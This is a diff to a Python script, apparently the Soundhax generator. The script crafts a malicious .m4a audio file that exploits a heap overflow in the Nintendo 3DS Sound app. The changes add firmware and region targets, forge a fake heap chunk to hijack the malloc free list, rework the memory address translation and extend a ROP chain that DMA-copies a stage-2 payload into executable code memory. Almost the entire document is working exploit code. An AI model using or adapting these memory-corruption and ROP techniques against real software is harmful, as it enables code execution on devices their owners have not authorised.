@@ -3,7 +3,7 @@
 import sys
 from struct import pack
 from subprocess import call
-from constants import STAGE2_SIZE, constants_21_22, constants_3x_and_later
+from constants import STAGE2_SIZE, OTHERAPP_CODE_VA, constants_pre_21, constants_21_22, constants_3x_and_later
 from os import environ, path, name as osname
 
 REGION = "usa"
@@ -18,12 +18,32 @@ if len(sys.argv) > 2:
 if len(sys.argv) > 3:
     FIRM = sys.argv[3].lower()
 
-constants = constants_3x_and_later if FIRM != "v21and22" else constants_21_22
+# Check for impossible combinations
+if TYPE not in ("old", "new"):
+    print("Error: invalid console type: {}".format(TYPE))
+    sys.exit(1)
+if FIRM not in ("pre21", "v21and22", "v3xand4x", "post5"):
+    print("Error: invalid system version range: {}".format(FIRM))
+    sys.exit(1)
+if TYPE == "new" and FIRM != "post5":
+    print("Error: can only use \"post5\" for N3DS")
+    sys.exit(1)
+if FIRM in ("pre21", "v21and22") and REGION not in ("usa", "eur", "jpn"):
+    print("Error: {} can only be used for USA/EUR/JPN regions".format(FIRM))
+    sys.exit(1)
+
+constants = {
+    "pre21": constants_pre_21,
+    "v21and22": constants_21_22,
+    "v3xand4x": constants_3x_and_later,
+    "post5": constants_3x_and_later,
+}[FIRM]
 
 for name, regions in constants.items():
     if REGION not in regions:
         print("Error: {} does not contain a constant for {}".format(REGION,
                                                                     name))
+        sys.exit(1)
     globals()[name] = regions[REGION]
 
 def p(x):
@@ -50,18 +70,14 @@ def get_shellcode():
         assert len(payload) == STAGE2_SIZE
         return payload
 
-# end = end1 + end2 in the code, pick end2 so end wraps to start+4
-desired_end = start + 4 # to make size 4
-magic_end = (desired_end - end1) % 2**32
-assert (end1 + magic_end) % 2**32 == desired_end
+def create_heap_chunk(prv, nxt, sz):
+    r  = "DU\x00\x00" # "used" marker, plus alignment-related fields = 0
+    r += p(sz)        # size, < 0x10 to avoid putting it in free list
+    r += p(prv)
+    r += p(nxt)
+    return r
 
 malloc_free_list_head = heapctx + 0x3C
-
-what = fake_free_chunk
-where = malloc_free_list_head
-
-r1 = what
-r2 = where - 12
 
 UNICODE_MARKER = '\xff\xfe' # unicode marker
 
@@ -69,41 +85,44 @@ exp = "<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x
 exp += " \x00"*((772-len(exp)) / 2)
 assert len(exp) == 772
 
-exp += "aaaa" # base
-exp += p(magic_end) # r3
-exp += p(r2) # r2
-exp += p(r1) # r1
+# Set malloc_free_list_head = fake_free_chunk
+# This also does fake_free_chunk->prev = malloc_free_list_head, which means
+# malloc_free_list_head = NULL after the subsequent "stack" allocation.
+# This should be fine unless we take over the control flow too late.
+exp += create_heap_chunk(malloc_free_list_head - 12, fake_free_chunk, 0)
 
 def pa_to_gpu(pa):
-    return pa - 0x0C000000
+    return pa - 0x20000000 + 0x14000000
 
 def gpu_to_pa(gpua):
-    return gpua + 0x0C000000
+    return gpua - 0x14000000 + 0x20000000
 
-# 16:06:09 @yellows8 | "> readmem:11usr=CtrApp 0x002F5d00 0x100"
-# "Using physical address: 0x27bf5d00 (in_address = 0x002f5d00)"
 def code_va_to_pa(va):
-    if TYPE == "old":
-        if FIRM == "post5":
-            return va + 0x23D00000
-        else:
-            return va + 0x23D00000 - 0x78000
-    else:
-        return va + 0x27900000
+    """
+    Since the APPLICATION memregion is unused before we start up the application,
+    the image is allocated from the end of the memregion, at end(APPLICATION) - code_image_size
+    (linear mem is allocated from the start).
 
-#starts at this pop
-#.text:0027DB00 LDMFD           SP!, {R4-R10,PC}
+    Before system version 5.0, the image VA<>PA mapping is flat. On 5.0 and above, however,
+    the kernel tries to optimize the layout by giving mappings that as as large as possible.
+
+    Since .text is the only section/segment being bigger than 1MB (it's almost 2MB in size), its first
+    MB is given a "section" (1MB) mapping at end(APPLICATION) - 2MB.
+    """
+    off = va - 0x00100000
+    appmem_end = 0x24000000 if TYPE == "old" else 0x27C00000
+
+    if FIRM == "post5" or TYPE == "new":
+        return appmem_end - 0x00200000 + off
+    else:
+        return appmem_end - code_image_size + off
+
+def code_va_to_gpu(va):
+    return pa_to_gpu(code_va_to_pa(va))
 
 payload = get_shellcode()
 
-rop  = "AAAA" # r4
-rop += "BBBB" # r5
-rop += "CCCC" # r6
-rop += "DDDD" # r7
-rop += "EEEE" # r8
-rop += "FFFF" # r9
-rop += "GGGG" # r10
-rop += p(pop_r0_pc) # pc
+rop  = p(pop_r0_pc) # pc
 rop += p(payload_heap_addr) # dst
 rop += p(pop_r1_pc)
 rop += p(payload_stack_addr) # src
@@ -130,17 +149,17 @@ rop += "bbbb" # r4
 rop += "cccc" # r5
 rop += "dddd" # r6
 rop += p(gpu_enqueue_gadget)
-if REGION != 'kor':
+if REGION not in ('kor', 'chn', 'twn'):
     rop += "aaaa" # skipped
 rop += p(4)
 rop += p(payload_heap_addr)
-rop += p(pa_to_gpu(code_va_to_pa(stage2_code_va)))
+rop += p(code_va_to_gpu(stage2_code_va))
 rop += p(STAGE2_SIZE)
 rop += p(0)
 rop += p(0)
 rop += p(8)
 rop += p(0)
-if REGION == 'kor':
+if REGION in ('kor', 'chn', 'twn'):
     rop += "aaaa" # skipped (with KOR the above gxcmd buffer is at sp+0 instead of sp+4, but stackframe size is the same)
 rop += "AAAA" # r4
 rop += "AAAA" # r5
@@ -148,7 +167,7 @@ rop += "AAAA" # r6
 rop += "AAAA" # r7
 rop += "AAAA" # r8
 rop += "AAAA" # r9
-if REGION != 'kor':
+if REGION not in ('kor', 'chn', 'twn'):
     rop += "AAAA" # r10
     rop += "AAAA" # r11
 rop += p(pop_r0_pc) # pc
@@ -157,14 +176,12 @@ rop += p(pop_r1_pc) # pc
 rop += p(0) # r1
 rop += p(sleep_gadget) # pc # {R4-R6,LR}
 rop += "aaaa" # r4
-rop += "bbbb" # r5
+rop += p(code_va_to_gpu(OTHERAPP_CODE_VA)) # r5
 rop += "cccc" # r6
 rop += p(stage2_code_va)
 rop += payload
 
-tkhd_data = 'A'*136 # padding
-if REGION != 'kor':
-    tkhd_data += 'A'*0x28 # padding
+tkhd_data = 'P'*fake_free_chunk_padding # padding
 tkhd_data += rop # ROP starts here
 tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000'.decode("hex")
 tkhd_data += '0000000000000000010000000000000000000000000000400000000000000000000000'.decode("hex")
@@ -254,9 +271,9 @@ if TYPE == "new":
     fn = './soundhax-{}-{}.m4a'.format(REGION, "n3ds")
 else:
     assert TYPE == "old"
-
-    if FIRM == "v21and22":
-        assert REGION in ("usa", "eur", "jpn")
+    if FIRM == "pre21":
+        fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "pre2.1")
+    elif FIRM == "v21and22":
         fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "v2.1and2.2")
     elif FIRM == "v3xand4x":
       fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "v3.xand4.x")
